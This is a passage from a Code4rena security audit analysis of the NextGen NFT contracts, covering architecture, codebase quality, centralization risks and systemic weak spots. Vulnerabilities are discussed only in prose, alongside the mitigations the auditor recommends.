 - If there exists repetitive documentation (mainly in [Mechanism Review](#mechanism-review)), it is to provide the judge with more context on a specific high-level or in-depth scenario for ease of understandability.

## Approach taken in evaluating the codebase

### Time spent on this audit: 14 days (Full duration of the audit)

Day 1-4
 - Understand the idea of the project and grasp a high level mental model of the contract interactions.
 - Reviewed the NextGenAdmins, NextGenCore and MinterContract to understand the core functionality of the protocol.
 - Add inline bookmarks in the code in the form of questions, such as, "Could X do Y to mint more tokens or bypass this Z check?"
 - Noted down some obvious gas optimizations and low-severity issues not covered by the bot.

Day 5-9
 - Reviewed the AuctionDemo and the 3 Randomizer contracts.
 - Explored findings and manually validated them with inline bookmarks.
 - Read about Chainlink VRF security consideration as well as researched the ARRNGController.sol contract deployed on Ethereum mainnet.
 - Added some more notes for attack ideas to visit later on.

Day 10-11
 - Writing Gas/QA report.
 - Writing HM reports with only written POC for now.

Day 12-14
 - Setting up a foundry environment within the hardhat tests.
 - Validating most of the HMs with coded POCs/tests.
 - Filtering out invalid and low-severity issues from HMs.
 - Writing Analysis Report.

## Architecture recommendations

### Protocol Structure

The protocol has been structured in a very simplistic manner. The contracts in the protocol can be divided into five categories, namely, Core, Minter, Admin, Auction and Randomizer contracts. 

![image](https://user-images.githubusercontent.com/109625274/282527537-9b0dddfb-0110-47cd-9f29-74a861aa5a45.png)

### What's unique?

1. **Use of Solidity's rounding for Periodicity in Sales model 2 and 3** - Solidity's loss of precision/rounding down has been used as a feature to calculate tDiff and periods for the Exponential/Linear descending Sales (sales option 2) and Periodic Sale model (sales option 3). This allows the property of periodicity to exist in the codebase, allowing to enforce invariants such as "1mint/period".
2. **On-chain and off-chain metadata compatiblity** - The NextGen contracts allows collections of any type to support on-chain and off-chain metadata compatibility, which opens up doors to experimental features such as University Certificates, On-chain Music, Artwork and many more sectors to flourish.
3. **Freezing and setting final supply for collections** - Most NFT contracts allow changing the supply by minting/burning tokens, thereby fluctuating the demand. By locking the data and final supply, immutability is revitalized into the collection, which can help increase user trust into the creators and their collection.
4. **Intentional Pseudo-Randomness** - The RandomizerNXT.sol contract introduces a model similar to PRNG, which provides the NextGen team to sell it as a separate service as well as provide the collection artist with more options, ideas and innovations to integrate with their existing collection idea/generative script.
5. **Connection with the outside NFT world** - Other than marketplaces where NFT's can be directly transferred/bought/sold, NextGen introduces another market to exist using their `burnOrSwapExternalToMint()` function in MinterContract with external NFT tokens. This is a particularly simple implementation but opens up a lot of pathways, considering NextGen collections are experimental and can include collections ranging from on-chain music ownership to mintpass systems.
6. **Combination of 3 Sale models with allowlist/public phases** - There are currently numerous combinations between the two phase types and 3 sale models, which allow artists to hold multiple allowlist/public phases with any sales model of their choice. For example, when the NFT trade market (such as [nftperp](https://nftperp.xyz/)) is in a bull run, the collection admins can generate more revenue by selling more tokens to users by setting up multiple rounds of allowlist/public phases ready for minting.
7. **Guarded launch of collections through max allowances** - The collection admins can use max allowances along with periodic sale minting to ensure the prices of their NFTs (in the external markets) are less volatile during launch. This is a hidden but unique feature of allowances along with periodicity that unlocks new opportunities for the collection creators.

### What ideas can be incorporated?

 - Integrating ERC1155 tokens to not limit artist to ERC721 standard non-fungibility model.
 - Allowing users to auction their NFT tokens.
 - Allowing support for multi-artist collections since the current codebase only allows one artist's signature to be stored for a collection.
 - Enabling delegates to enter auction on behalf of delegator.
 - Support for re-auctioning a token in AuctionDemo.sol.

## Codebase quality analysis

Since I found numerous coded POC confirmed issues, the only way I would decide the quality of this codebase is through the issues per contract and design structure; i.e. code readability/maintainability.

**Admins Contract:** The NextGenAdmins contract was quite simplistic. I had a quick glance at it since it was short and brief to understand. Since there were no issues here, I would mark this as high-quality.

**Randomizer Contracts:** The RandomizerVRF.sol, RandomizerRNG.sol and RandomizerNXT.sol collectively only had around 3 issues, some of which had no severe impact on the codebase. When it comes to the security considerations and code maintainability, the team seems to knowing the intricacies and some potential attack vectors, which have been neatly mitigated with access controls and limiting function visibility. Due to this, I would mark this as high-quality.

**AuctionDemo Contract:** This contract has 3 High-severity issues, which were missed out due to loose equality checks and missing storage updates in the `claimAuction()` and `cancelAllBids()` functions. The design choice of participate-claim-cancel makes sense, but the severity of the issues any day overshadow the design choice for quality since the potential impact of the issues expand not only to the current auction but also to other auctions running in parallel. Due to this, I would mark this as low-quality.

**MinterContract:** Most of the high and medium-severity issues I found were heavily related to this contract's missing state updates, require checks, missing functionality for support of sales model 3 as well as breaking of invariants. Due to this, I would mark this as low-quality.

**NextGenCore Contract:** The NextGenCore contract included 2 High-severity issues, one from reentrancy through `_safeMint()` and the other due to missing state update in `burnToMint()`. The rest of the contract does not seem to have any major issues that I've come across. Due to this, I would mark this as low-quality.

**Test Coverage of these contracts** The Core contracts have tests implemented in hardhat except AuctionDemo.sol and the Randomizers. The core contract have not been tested for specific branches or combinations but only basic functionality. Additionally, no fuzz testing, strict invariant testing or fork testing has been performed, considering the fact that randomness services like Chainlink VRF is used.

Although, I have not delved deeper into the issues here, this is my overall opinion on the codebase quality analysis based on both issues per contract and code readability/maintainability. Due to this, I would rank it as almost close to touching the Medium-quality bar but no higher.

## Centralization risks

**A.** There are 4 trusted roles that are already mentioned in README, which are (from highest to lowest power):
1. Global Admin
2. Function Admin
3. Collection Admin
4. Artist

**B.** Each of these roles have their downsides. But let's see how they can be mitigated:
1. In case, the collection admin and artist turn out to be malicious, the global admin can just revoke their permissions. 
2. But in case, the global and function admins turn out be malicious, the collection admins and artists are at risk.
3. In order to ensure less centralization in this aspect, each collection admin/artist should have a separate multi-sig with the global/function admin. But unfortunately, this will not be enough since the global/function admins can always gain majority or remove collection admins/artist. In order to further decentralize this, consider implementing a RBAC timelock on all admin related functions, which can be voted upon by the collection admins/artists. This would be the safest implementation in my opinion.

**C.** Last but not the least, there is another crucial role in the codebase, which has not been surfaced even in the README. This is the `ownerOf()` or the deployer of the AuctionDemo.sol contract. This role is entrusted with or receives all the auction winner's ETH bid amounts. It is important to ensure that this address is some sort of multisig handled by the team.

Overall, the codebase is reasonably centralized since certain functions requiring it to be but there are inconsistencies in how these access controls have been applied on functions (especially in the NextGenCore contract). I would highly recommend the sponsors to create a deeper guide on what actions each role in the hierarchy are allowed to perform.

## Resources used to gain deeper context on the codebase

1. [NextGen documentation](https://seize-io.gitbook.io/nextgen/)
2. [Chainlink VRF - Security Considerations](https://docs.chain.link/vrf/v2/security)
3. [ARRNGController contract live on Ethereum mainnet](https://vscode.blockscan.com/ethereum/0x000000000000f968845afB0B8Cf134Ec196D38D4)

## Mechanism Review

### High-level System Overview

![image](https://user-images.githubusercontent.com/109625274/282560390-c23260f6-755f-4bb5-b9f1-4f9bc679149c.png)

### Chains supported

 - Only Ethereum is supported currently.

### Documentation/Mental models

**Here is the basic inheritance structure of the contracts in scope**

*Note: The NextGenCore, MinterContract, NextGenAdmins and AuctionDemo contract are singular and independent of each other and do not use any form of inheritance among themselves. This, I believe, is a good design choice since it allows separation of storage and concerns among each other.*

The RandomizerNXT.sol is the only contract that inherits from another in-scope contract, i.e. XRandoms.sol

![Image](https://user-images.githubusercontent.com/109625274/282554425-a22727f5-b607-40cd-80c6-f371db28afc8.png)

### Features of Main Contracts

![Image](https://user-images.githubusercontent.com/109625274/282552920-938475e8-0bda-4353-b4db-691b8923f549.png)

### Features of each Sales model

Periodic Sale (Option 3)
 - Mints are limited to `1` token during each time period (e.g. minute, hour, day).
 - The minting cost can either stable or have a bonding curve (increase) over time.
 - If `rate = 0`, minting cost price does not increase per minting.
 - If rate is set, then the minting cost price increases based on the tokens minted as well as the rate.

Exponential Descending Sale (Option 2):
 - At each time period (which can vary), the minting cost decreases exponentially until it reaches its resting price (ending minting cost) and stays there until the end of the minting phase.
 - In this model the starting and ending minting costs and the time period are set while the rate is `0`.

Linear Descending Sale (Option 2):
 - At each time period (which can vary), the minting cost decreases linearly until it reaches its resting price (ending minting cost) and stays there until the end of the minting phase.
 - In this model all parameters need to be set.

## Systemic Risks/Architecture-level weak spots and how they can be mitigated

1. Using ARRNG as a service for randomness

I did some past transaction research on the ARRNGController.sol contract live on Ethereum mainnet and found out there has only been one call of `requestRandomness` and `serveRandomness`, which was called almost 100 days back ([see here](https://etherscan.io/address/0x000000000000f968845afB0B8Cf134Ec196D38D4)). Since there is no past transaction data to study, the reliability of the service cannot yet be guaranteed.

Furthermore, if you look closely, it took 8 block confirmations for the serve randomness to be called through the RNG service. This would be necessary if we were on POW but now the Ethereum POS network will work just fine with 3 minimum block confirmations ([as done over here in the RandomizerVRF.sol contract](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerVRF.sol#L28)) due to a block requiring 2/3rd of the total staked ether votes in favour in order for it to become justified. Thus, using only Chainlink VRF might be the best option while still ensuring the fastest response time.

![Image](https://user-images.githubusercontent.com/109625274/282561975-3b334247-d33f-4d74-8a1e-826b2fc690a7.png)

2. Using OZ's AccessControl contract - Currently, there are no issues with the Admins contract and never might be in the future but it is good practice to use an existing standard such as AccessControl.sol by OpenZeppelin due to its widespread usage and modularity for handling roles in all types of situations.

3. Although addressed in the bot report, there are very high changes of the current implementation causing a DOS issue with airdropping tokens since external calls are made to the gencore contract in a for loop. To mitigate this, ensure airdrops are done in batches such that the block gas limit is not exceeded if airdropping too many users.

4. Frontrunning in `mint()` - The `mint()` function in the minter contract is prone to frontrunning by bots to mint tokens earlier. This would become a major issue for a free or low cost collection that uses the Periodic Sale model (sales option 3), which only allows 1mint/period. This would affect the normal users who will not be able to `mint()` unless the bot lets them for a certain time. This can only be mitigated through Flashbots RPC in my opinion but raising this issue in case sponsors find some leads to solutions.

5. Miners manipulating `block.timestamp` - It is possible for miners to manipulate the `block.timestamp` by a few seconds in order to `mint()` first during a Periodic Sale (sales option 3). The impact as mentioned previously is the same since normal users are affected in these edge case scenarios.

6. `lastMintDate` stores incorrect time - In one of my issues, I have demonstrated how it is possible for `lastMintDate` to be set to a very far time in the future if a collection uses Periodic sale during both allowlist and public phases. This is a big system risk to the protocol since it breaks the 1mint/period invariant. The issue includes a coded poc as well which demonstrates the issue and its impact on the users and creators of the collection.

7. Randomness is lost - It is possible for the VRF subscription plan to run out of LINK or the RNG contract to run out of ETH. Due to this, any randomness pending to be received by the Randomizer contracts is lost and the tokenHash of the tokenId is left empty forever. To avoid such an issue, implement a bot or emergency mechanism that alerts the team when the LINK or ETH goes below a certain critical threshold.

8. There are several inconsistencies between where the NFTDelegation mechanism is used and where it is not. This ambiguity denies the cold wallet users using delegation as a mechanism to avoid signing risky transactions and participating in certain services such as auctions, `burnToMint()` etc. Ensure the NFTDelegation mechanism is implemented in all places where normal hot wallet users would interact as well.

9. Incomplete comment can lead to problems during phases - This [comment](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/MinterContract.sol#L243) here does not mention to set the `allowlistEndTime` to `0`. If this is not set to `0` and the collection admins think `allowlistEndTime` also has to be set to `publicEndTime`, this would cause the public phase calls to enter the `allowlist` if conditional block in the `mint()` function first, leading to incorrect behaviour. Make sure to provide clear documentation on how values for phases can be set correctly and with more clarity in order to avoid misconfigurations.

10. In AuctionDemo.sol, it is possible that no bids can be placed on an auctioned token (highly unlikely but still possible). In such a case, re-auctioning the token is not supported by the AuctionDemo.sol contract, which would be a problem. Though this can be solved by deploying another auction contract, adding a re-auctioning functionality will make the codebase more verbose and resilient in case of such edge scenarios.

11. Limitation of token payment methods when minting - Try integrating more ERC20 tokens and stablecoins in the current model since only ETH is accepted currently.

## Some questions I asked myself

1. Can a user prevent another user from setting a higher bid?
   - No.

2. Can updating the core contract in minter contract cause any issues?
   - Yes, it will prevent collections on the old core contract to not be allowed to use `airdrop()`, `mint()` and `burnToMint()` functionality.

3. If a collection is created, can one mint before randomizer contract or any other contract is set?
   - No call would revert since `calculateTokenHash()` does not exist.

4. Can minting start before data is set or artist signature is set?
   - As long as dates are set yes, but this would require admin misconfig.

5. How many collections can be supported based on how Ids are served in the gencore contract?

    - To get a sense: Gauging the number of collections and number of tokens per collection that can exist with the current implementation of reserved indexes:
      - Number of collections `= type(uint256).max / 10000000000 = 115792089237316195423570985008687907853269984665640564039457584007913129639935 / 10000000000 = 11579208923731619542357098500868790785326998466564056403945758400791` collections.
      - Number of tokens per collection `= 10000000000`.

    - Suggestion for sponsors: Number of tokens per collection can be increased since the NextGen contracts is experimentational and it's growth should not be underestimated in case the concept of university certificates (issued each year) or some new idea pops up that requires more than the current reserved index range of `10000000000` to be used.

6. Can we reenter through `cancelBid`? 
   - Not possible, since `auctionDataInfo` is updated to false before making external call to return bidder's ETH.

7. Small mistake in docs:

   - Mistake in docs - https://seize-io.gitbook.io/nextgen/for-creators/sales-models#sales-models-examples 

    - In linear descending model, the statement is incorrect. It should be "During 10th Price period price 3.1 ETH" and 11th Price period price remains constant as shown in the diagram above the explanation, as well.

### Time spent

140 hours

**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/2005#issuecomment-1846150156):**
 > This Analysis prevails and distinguishes itself from the rest by providing a systematic analysis of one of the randomness providers (ARRNG) which is validly **not** considered a de facto standard, while also ticking all other checkboxes. 

***


# Disclosures

C4 is an open organization governed by participants in the community.

C4 Audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
